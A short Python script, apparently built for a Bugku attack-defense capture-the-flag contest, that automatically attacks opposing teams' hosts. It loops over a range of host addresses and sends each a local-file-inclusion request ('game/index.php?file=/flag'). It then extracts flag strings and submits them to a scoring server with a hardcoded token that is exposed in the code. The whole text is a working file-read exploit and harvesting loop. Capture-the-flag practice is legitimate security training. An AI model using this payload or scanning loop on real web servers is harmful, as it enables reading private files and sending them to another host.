import re
import requests
比赛编号 = "4311"
token = "cb4b0d3a02febd552624b1d31ca377e7"
payload = "game/index.php?file=/flag"
while True:
    for i in range(2, 254):
        url = 'http://192-168-1-{}.pvp{}.bugku.cn/{}'.format(i,比赛编号,payload)
        try:
            response = requests.get(url)
            pattern = r'flag\{.*?\}'
            flags = re.findall(pattern, response.text)
            for flag in flags:
                print(url,flag)
                data = "https://ctf.bugku.com/pvp/submit.html?token={}&flag={}".format(token,flag)
                send = requests.get(data)
        except:
            pass